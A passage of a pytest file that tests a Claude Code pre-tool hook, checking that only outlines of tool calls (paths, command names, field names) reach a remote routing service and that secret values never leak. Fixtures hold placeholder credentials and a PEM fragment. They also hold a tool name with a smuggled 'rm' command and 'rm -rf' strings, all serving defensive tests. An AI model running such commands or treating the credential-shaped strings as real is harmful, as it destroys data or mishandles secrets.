    "aws_secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYzz9Q7Z8XQK",
    "pw": "correcthorsebattery42",
    "short": "Hunter2!",
    "n8n": "n8n_api_" + "f3a9c1e7b2d84a6c9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b",
}
DOTENV = "".join("%s=%s\n" % (k.upper(), v) for k, v in FILE_BODY_SECRETS.items())
PEM = ("-----BEGIN RSA PRIVATE KEY-----\n" + "MIIEowIBAAKCAQEAu1SU1LfVLPHCozMxH2Mo4lgOEePzNm0tRgeLezV6ffAt0gunVTLw7onLRnrq0\n" * 4 +
       "-----END RSA PRIVATE KEY-----\n")


@pytest.mark.parametrize("tool,tool_input,expected", [
    ("Write", {"file_path": "/repo/.env", "content": DOTENV}, "path /repo/.env\nfields file_path content"),
    ("Write", {"file_path": "/repo/id_rsa", "content": PEM}, "path /repo/id_rsa\nfields file_path content"),
    ("Edit", {"file_path": "/repo/cfg.py", "old_string": "x", "new_string": DOTENV, "replace_all": True},
     "path /repo/cfg.py\nfields file_path old_string new_string replace_all"),
    ("NotebookEdit", {"notebook_path": "/repo/n.ipynb", "new_source": DOTENV, "cell_id": "c1"},
     "path /repo/n.ipynb\nfields notebook_path new_source cell_id"),
])
def test_a_file_tool_sends_the_path_and_the_field_names_and_no_content(stub, tool, tool_input, expected):
    go(stub, payload(tool=tool, tool_input=tool_input))
    assert sent_text(stub) == expected
    everything = sent_everything(stub)
    assert [n for n, v in FILE_BODY_SECRETS.items() if v in everything] == []
    assert "PRIVATE KEY" not in everything and "MIIEow" not in everything


def test_a_bash_command_that_writes_a_secret_file_sends_the_target_and_not_the_body(stub):
    command = "cat > .env <<'EOF'\n" + DOTENV + "EOF\ngh auth login --with-token <<< %s" % FILE_BODY_SECRETS["ghp"]
    go(stub, payload(command=command))
    assert sent_text(stub) == "cat .env\ngh --with-token"
    everything = sent_everything(stub)
    assert [n for n, v in FILE_BODY_SECRETS.items() if v in everything] == []


PLAIN = "correcthorsebattery42"


# Only the keys of the input object itself leave. A key below one is the caller's
# data: a map keyed by names or tokens, a header, an environment variable.
@pytest.mark.parametrize("tool_input,names", [
    ({"password": PLAIN}, "password"),
    ({"username": "tee", "password": PLAIN}, "username password"),
    ({"variables": {"DB_PASSWORD": PLAIN}}, "variables"),
    ({"env": {"DB_PASSWORD": PLAIN, "N8N_VPS_KEY": "Zq81nT0wUv44"}}, "env"),
    ({"key": "DB_PASSWORD", "value": PLAIN}, "key value"),
    ({"name": "SMTP_PASS", "value": PLAIN}, "name value"),
    ({"env": [{"name": "SMTP_PASS", "value": PLAIN}]}, "env"),
    ({"headers": {"x-devon-key": PLAIN}}, "headers"),
    ({"headers": {"Authorization": "Bearer " + PLAIN}}, "headers"),
    ({"credentials": {"user": "tee", "secret": {"value": PLAIN}}}, "credentials"),
    ({"auth": [PLAIN]}, "auth"),
    ({"token": "abc"}, "token"),
    ({"operations": [{"node": {"parameters": {"apiKey": PLAIN, "body": DOTENV}}}]}, "operations"),
    ({"a": None, "b": True, "c": 1.5, "d": [], "e": {}}, "a b c d e"),
])
def test_an_mcp_call_sends_the_field_names_and_never_a_value(stub, tool_input, names):
    go(stub, payload(tool="mcp__railway__set_variables", tool_input=tool_input))
    assert sent_text(stub) == "fields " + names
    everything = sent_everything(stub)
    assert PLAIN not in everything and "Zq81nT0wUv44" not in everything and "tee" not in sent_text(stub).split()
    assert [n for n, v in FILE_BODY_SECRETS.items() if v in everything] == []


@pytest.mark.parametrize("tool_input", [None, "a string", ["a", "b"], 7, True, {}, [], {"": 1}])
def test_an_mcp_input_with_no_field_names_sends_the_tool_name_alone(stub, project, tool_input):
    go(stub, {"session_id": "s1", "tool_name": "mcp__x__y", "cwd": "/repo", "tool_input": tool_input})
    assert sent_text(stub) == ""
    assert stub.requests[-1]["body"]["state"]["tool_name"] == "mcp__x__y"
    assert ledger(project)[-1]["outcome"] == "answered"


def test_a_secret_used_as_a_field_name_is_dropped(stub):
    keys = {
        FILE_BODY_SECRETS["ghp"]: "label",
        "Authorization: Bearer abcdefgh12345678": "x",
        "0123456789abcdef0123456789abcdef": 1,
        "a" * 31: 1,
        "key with space": 1,
        "k1234567": 1,
        "9starts_with_digit": 1,
        "café": 1,
        "ok_name": 1,
        "x" * 30: 1,
    }
    go(stub, payload(tool="mcp__x__y", tool_input=keys))
    assert sent_text(stub) == "fields ok_name " + "x" * 30
    everything = sent_everything(stub)
    assert FILE_BODY_SECRETS["ghp"] not in everything and "abcdefgh12345678" not in everything


def test_ordinary_mcp_field_names_still_leave(stub):
    go(stub, payload(tool="mcp__github__create_pull_request",
                     tool_input={"owner": "tdveal74-cell", "repo": "app", "title": "Fix the sweep", "draft": True}))
    assert sent_text(stub) == "fields owner repo title draft"
    assert "tdveal74" not in sent_everything(stub) and "sweep" not in sent_everything(stub)


def test_field_names_are_the_top_level_keys_in_order_and_nothing_below():
    deep = {"l0": {"l1": {"l2": {"l3": {"l4": {"l5": {"l6": {"l7": {"l8": {"l9": 1}}}}}}}}}}
    assert jev.field_names(deep) == ["l0"]
    assert jev.field_names({"a": [{"b": 1}, {"b": 2, "c": 3}], "d": 4, "e": {"f": 1}}) == ["a", "d", "e"]
    for not_an_object in ([{"a": 1}], "a string", 7, None, [[{"a": 1}]]):
        assert jev.field_names(not_an_object) == []


@pytest.mark.parametrize("tool_input,names", [
    ({"users": {"correcthorsebatterystaple": {"role": "admin"}}}, "users"),
    ({"values": {"hunter2": "x"}}, "values"),
    ({"users": [{"correcthorsebatterystaple": 1}]}, "users"),
    ({"map": {"alice": 1, "bob": 2}, "set": {"carol": 3}}, "map set"),
])
def test_a_key_below_the_top_of_the_input_is_the_callers_data_and_never_leaves(stub, tool_input, names):
    """A map keyed by user strings has its secret in a key. The character class
    cannot tell it from a name, 69 percent of random 24 character tokens fit it,
    and so nothing below the top level of the input leaves."""
    go(stub, payload(tool="mcp__kv__set", tool_input=tool_input))
    assert sent_text(stub) == "fields " + names
    everything = sent_everything(stub)
    for word in ("correcthorsebatterystaple", "hunter2", "alice", "bob", "carol", "role"):
        assert word not in everything, word


def test_random_tokens_used_as_map_keys_never_leave():
    rng = random.Random(7)
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    for length in (12, 20, 24, 29):
        for _ in range(500):
            token = rng.choice(alphabet[:52]) + "".join(rng.choice(alphabet) for _ in range(length - 1))
            assert jev.field_names({"tokens": {token: "label"}}) == ["tokens"]
            assert token not in jev.build_text("mcp__x__y", {"tokens": {token: "label"}}, "/", "/home/nobody")


def test_a_huge_input_is_cut_at_the_field_and_node_caps():
    started = time.monotonic()
    assert len(jev.field_names({"ids": list(range(500000))})) == 1
    assert len(jev.field_names({"f%d" % i: i for i in range(100000)})) == jev.MAX_FIELDS
    assert len(jev.field_names({"a": [{"k%d" % i: 1} for i in range(1000)]})) <= jev.MAX_FIELDS
    assert time.monotonic() - started < 0.5


def test_a_wide_mcp_input_is_cut_at_a_field_boundary(stub):
    wide = {"n" + chr(97 + i // 26) + chr(97 + i % 26) + "q" * 26: i for i in range(300)}
    go(stub, payload(tool="mcp__x__" + "y" * 100, tool_input=wide))
    names = sent_text(stub).split()[1:]
    assert sent_chars(stub) <= jev.MAX_OUT
    assert len(names) == jev.MAX_FIELDS and all(len(name) == 29 for name in names)


def test_a_tool_name_outside_the_character_class_sends_nothing(stub, project):
    for name in ("Bad Tool", "x;rm", "tést", "a" * 121, "mcp__x/y"):
        assert go(stub, payload(tool=name)) is None
        assert ledger(project)[-1]["outcome"] == "bad_input"
    assert stub.requests == []


def test_the_request_shape(stub):
    go(stub)
    sent = stub.requests[-1]
    assert sent["method"] == "POST" and sent["path"] == "/v1/systemone"
    assert sent["headers"]["Content-Type"] == "application/json"
    assert "Authorization" not in sent["headers"]
    body = sent["body"]
    assert set(body) == {"model", "state", "questions"}
    assert set(body["state"]) == {"tool_name", "tool_input"}
    assert set(body["questions"]) == {"better_tool", "needs_human"}
    for q in body["questions"].values():
        assert q["type"] == "noul" and set(q["criteria"]) == {"true", "false"}


def test_the_questions_describe_an_outline_and_not_a_command():
    note = jev.STATE_NOTE
    assert "never holds a value" in note
    assert "key: value" not in note


def test_the_ledger_never_holds_the_input(stub, project):
    go(stub, payload(command="cat a-very-distinctive-filename.txt"))
    text = (project / ".claude" / "ledger" / "jev-route.jsonl").read_text()
    assert "distinctive" not in text
    row = ledger(project)[-1]
    assert row["input_sha"] == jev.input_digest("Bash", {"command": "cat a-very-distinctive-filename.txt"})
    assert row["sent_chars"] == sent_chars(stub)


def test_the_hash_is_of_the_raw_call_so_identical_means_identical():
    a = jev.input_digest("Bash", {"command": "rm -rf build"})
    assert a == jev.input_digest("Bash", {"command": "rm -rf build"})
    assert a != jev.input_digest("Bash", {"command": "rm -rf dist"})
    assert a != jev.input_digest("bash", {"command": "rm -rf build"})
    assert a != jev.input_digest("Bash", {"command": "rm -rf build", "timeout": 5})
    assert jev.input_digest("Bash", {"b": 1, "a": 2}) == jev.input_digest("Bash", {"a": 2, "b": 1})
    assert jev.input_digest("Bash", {1: "x", "a": 2})
    assert jev.input_digest("Bash", {"x": "\ud800"})


# ---------------------------------------------- no scrubbing, no backtracking


def test_nothing_is_cut_out_of_the_raw_call():
    """The held version scrubbed the call. This one has no scrubber to miss with."""
    source = HOOK.read_text()
    assert "gate_ledger" not in source
    assert not hasattr(jev, "load_scrub") and not hasattr(jev, "outbound") and not hasattr(jev, "OUTBOUND_SHAPES")


REPEATS = ("MAX_REPEAT", "MIN_REPEAT", "POSSESSIVE_REPEAT")


def quantifier_faults(pattern):
    """Nested or adjacent unbounded quantifiers in a regex, by parsing it."""
    faults = []

    def name_of(op):
        return getattr(op, "name", repr(op))

    def children(op, av):
        name = name_of(op)
        if name in REPEATS:
            yield av[2]
        elif name == "SUBPATTERN":
            yield av[3]
        elif name == "BRANCH":
            yield from av[1]
        elif name in ("ASSERT", "ASSERT_NOT"):
            yield av[1]
        elif name == "ATOMIC_GROUP":
            yield av
        elif name == "GROUPREF_EXISTS":
            yield from (part for part in av[1:] if part is not None)

    def walk(seq, inside_unbounded):
        previous = False
        for op, av in seq:
            repeat = name_of(op) in REPEATS
            unbounded = repeat and av[1] == sre_parse.MAXREPEAT
            if repeat and inside_unbounded:
                faults.append("nested")
            if unbounded and previous:
                faults.append("adjacent")
            previous = unbounded
            for child in children(op, av):
                walk(child, inside_unbounded or unbounded)

    walk(sre_parse.parse(pattern), False)
    return faults


def test_the_fault_finder_finds_faults():
    assert "nested" in quantifier_faults(r"(a+)+")
    assert "nested" in quantifier_faults(r"(?:ab*)*c")
    assert "nested" in quantifier_faults(r"(a|b+)*")
    assert "adjacent" in quantifier_faults(r"\s*\S*")
    assert "adjacent" in quantifier_faults(r"[a-z]+\d*x")
    assert quantifier_faults(r"[A-Za-z0-9._/~-]{1,200}") == []
    assert quantifier_faults(r"[^ \t]+") == []


def test_no_regex_in_the_hook_has_a_nested_or_adjacent_unbounded_quantifier():
    tree = ast.parse(HOOK.read_text())
    calls, literals = [], []
    for node in ast.walk(tree):
        if (isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)
                and isinstance(node.func.value, ast.Name) and node.func.value.id == "re"):
            calls.append(node)
            if node.args and isinstance(node.args[0], ast.Constant) and isinstance(node.args[0].value, str):
                literals.append(node.args[0].value)
    assert calls and len(calls) == len(literals), "every pattern is a literal that can be read here"
    for pattern in literals:
        assert quantifier_faults(pattern) == [], pattern


def test_the_hook_imports_only_what_it_uses():
    imports = {n.names[0].name.split(".")[0] for n in ast.walk(ast.parse(HOOK.read_text())) if isinstance(n, ast.Import)}
    assert imports <= {"hashlib", "itertools", "json", "os", "re", "sys", "threading", "time", "urllib"}, imports


# ------------------------------------------------------------------ main()


def test_main_sends_through_the_outline_only(stub, monkeypatch):
    p = payload(tool="Write", tool_input={"file_path": "/repo/.env", "content": DOTENV})
    rc, _ = run_main(monkeypatch, json.dumps(p), stub.url)
    assert rc == 0
    assert [n for n, v in FILE_BODY_SECRETS.items() if v in sent_everything(stub)] == []


def test_main_fails_open_on_a_crash(stub, monkeypatch):
    def boom(*a, **k):
        raise RuntimeError("crash")
    monkeypatch.setattr(jev, "run", boom)
    rc, out = run_main(monkeypatch, json.dumps(payload()), stub.url)
    assert rc == 0 and out == ""


@pytest.mark.parametrize("stdin_text", ["not json", "[]", "{}", '{"tool_name": 7}', '{"tool_input": {"command": "ls"}}', "",
                                        "[" * 100000, '{"tool_name": "Bash", "tool_input": ' + "[" * 100000])
def test_main_on_bad_input_sends_nothing_and_says_so(stub, project, monkeypatch, stdin_text):
    rc, out = run_main(monkeypatch, stdin_text, stub.url)
    assert rc == 0 and out == ""
    assert stub.requests == []
    assert ledger(project)[-1]["outcome"] == "bad_input"


def test_main_on_input_over_the_stdin_cap_sends_nothing_and_says_so(stub, project, monkeypatch):
    big = '{"tool_name": "Bash", "tool_input": {"command": "%s"}}' % ("x" * jev.MAX_STDIN)
    rc, out = run_main(monkeypatch, big, stub.url)
    assert rc == 0 and out == "" and stub.requests == []
    assert ledger(project)[-1]["outcome"] == "bad_input"


def test_a_crash_inside_run_still_leaves_a_row(stub, project, monkeypatch):
    def boom(*a, **k):
        raise RuntimeError("Bearer tsk_live_abcDEF123456xyz")
    monkeypatch.setattr(jev, "run", boom)
    run_main(monkeypatch, json.dumps(payload()), stub.url)
    row = ledger(project)[-1]
    assert row["outcome"] == "crash" and row["error"] == "RuntimeError"


def test_a_lone_surrogate_is_sent_and_recorded(stub, project, monkeypatch):
    rc, out = run_main(monkeypatch, '{"tool_name": "Bash", "session_id": "s", "tool_input": {"command": "echo \\ud800"}}', stub.url)
    assert rc == 0 and len(stub.requests) == 1
    assert ledger(project)[-1]["outcome"] == "answered"


def test_the_script_runs_as_a_process_and_prints_nothing_while_send_is_off(project):
    proc = run_the_shipped_file(project, json.dumps(payload()))
    assert proc.returncode == 0 and proc.stdout == "" and proc.stderr == ""
    row = ledger(project)[-1]
    assert row["outcome"] == "off" and row["decision"] == "none" and "latency_ms" not in row


# --------------------------------------------------------------- the wiring


def jev_group():
    settings = json.loads((ROOT / ".claude" / "settings.json").read_text())
    groups = [g for g in settings["hooks"]["PreToolUse"] if any("jev_route.py" in h["command"] for h in g["hooks"])]
    assert len(groups) == 1
    return groups[0]


def test_the_matcher_names_exactly_the_tools_claude_md_names():
    assert jev_group()["matcher"] == "^(Bash|bash|Edit|Write|NotebookEdit|mcp__.*)$"


def test_the_matcher_is_exact_under_substring_search():
    """Claude Code tests the matcher as a regex search, so it must be anchored."""
    matcher = jev_group()["matcher"]
    for tool in ("Bash", "Edit", "Write", "NotebookEdit", "mcp__n8n_vps__publish_workflow"):
        assert re.search(matcher, tool), tool
    for tool in ("Read", "Grep", "Glob", "Agent", "TodoWrite", "MultiEdit", "BashOutput", "KillBash"):
        assert not re.search(matcher, tool), tool


def test_the_wrapper_maps_any_failure_to_a_visible_non_blocking_exit():
    hooks = jev_group()["hooks"]
    assert [h["command"] for h in hooks] == [WRAPPER]
    assert [h["timeout"] for h in hooks] == [5]


def test_the_budget_fits_inside_the_hook_timeout_with_room():
    timeout = jev_group()["hooks"][0]["timeout"]
    assert jev.HOOK_BUDGET_S <= timeout / 2
    assert jev.RESERVE_S < jev.HOOK_BUDGET_S


def test_the_ledger_directory_is_not_repository_content():
    assert ".claude/ledger/" in (ROOT / ".gitignore").read_text()


def test_the_test_file_is_in_the_standalone_job_and_in_the_documented_list():
    ci = (ROOT / ".github" / "workflows" / "ci.yml").read_text()
    assert re.search(r"^\s+test_jev_route\.py \\$", ci, re.M)
    assert "test_jev_route.py" in (ROOT / "CLAUDE.md").read_text().split("## Reproducing CI")[1].split("## Invariants")[0]


def test_no_em_or_en_dashes_in_the_hook_or_this_file():
    for path in (HOOK, pathlib.Path(__file__)):
        text = path.read_text(encoding="utf-8")
        assert chr(0x2014) not in text and chr(0x2013) not in text, path
